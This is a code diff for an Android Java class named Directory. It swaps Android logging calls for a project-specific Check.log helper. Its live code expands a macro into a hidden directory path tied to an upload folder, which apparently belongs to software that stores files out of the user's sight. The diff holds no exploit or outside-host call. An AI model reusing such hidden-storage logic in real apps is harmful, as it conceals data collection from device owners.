@@ -11,9 +11,8 @@ package com.android.service.file;
 
 import java.util.Enumeration;
 
-import android.util.Log;
-
 import com.android.service.auto.Cfg;
+import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
 // TODO: Auto-generated Javadoc
@@ -40,12 +39,12 @@ public class Directory {
 		final int macro = filename.indexOf(hiddenDirMacro, 0);
 		String expandedFilter = filename;
 		if (macro == 0) {
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " expanding macro");
+			if(Cfg.DEBUG) Check.log( TAG + " expanding macro");
 			// final String first = filter.substring(0, macro);
 			final String end = filename.substring(macro
 					+ hiddenDirMacro.length(), filename.length());
 			expandedFilter = Utils.chomp(Path.hidden(), "/") + end; // Path.UPLOAD_DIR
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " expandedFilter: " + expandedFilter);
+			if(Cfg.DEBUG) Check.log( TAG + " expandedFilter: " + expandedFilter);
 		}
 		return expandedFilter;
 	}
@@ -66,7 +65,7 @@ public class Directory {
 		 * "find filter shouldn't start with file:// : " + filter); //
 		 * 
 		 * if (filter.indexOf('*') >= 0) { //
-		 * if(AutoConfig.DEBUG) Log.d("QZ", TAG + " asterisc"); //
+		 * if(AutoConfig.DEBUG) Check.log( TAG + " asterisc"); //
 		 * 
 		 * // filter String baseDir = filter.substring(0,
 		 * filter.lastIndexOf('/')); final String asterisc = filter
@@ -77,7 +76,7 @@ public class Directory {
 		 * File fconn = null; try { fconn = new File("file://" + baseDir);
 		 * 
 		 * if (!fconn.isDirectory() || !fconn.canRead()) { //
-		 * if(AutoConfig.DEBUG) Log.d("QZ", TAG + " Error: not a dir or cannot read"); //
+		 * if(AutoConfig.DEBUG) Check.log( TAG + " Error: not a dir or cannot read"); //
 		 * EmptyEnumeration(); }
 		 * 
 		 * return fconn.list(asterisc, true);
@@ -85,7 +84,7 @@ public class Directory {
 		 * } catch (final IOException ex) { //
 		 * //
 		 * (IOException e) { } } } else { // single file //
-		 * if(AutoConfig.DEBUG) Log.d("QZ", TAG + " single file"); //
+		 * if(AutoConfig.DEBUG) Check.log( TAG + " single file"); //
 		 * { fconn = (FileConnection) Connector.open("file://" + filter,
 		 * Connector.READ);
 		 * 
@@ -97,7 +96,7 @@ public class Directory {
 		 * 
 		 * } catch (final IOException ex) { //
 		 * //
-		 * if(AutoConfig.DEBUG) Log.d("QZ", TAG + " closing"); //
+		 * if(AutoConfig.DEBUG) Check.log( TAG + " closing"); //
 		 * catch (Exception e) { } } }
 		 * 
 		 * //
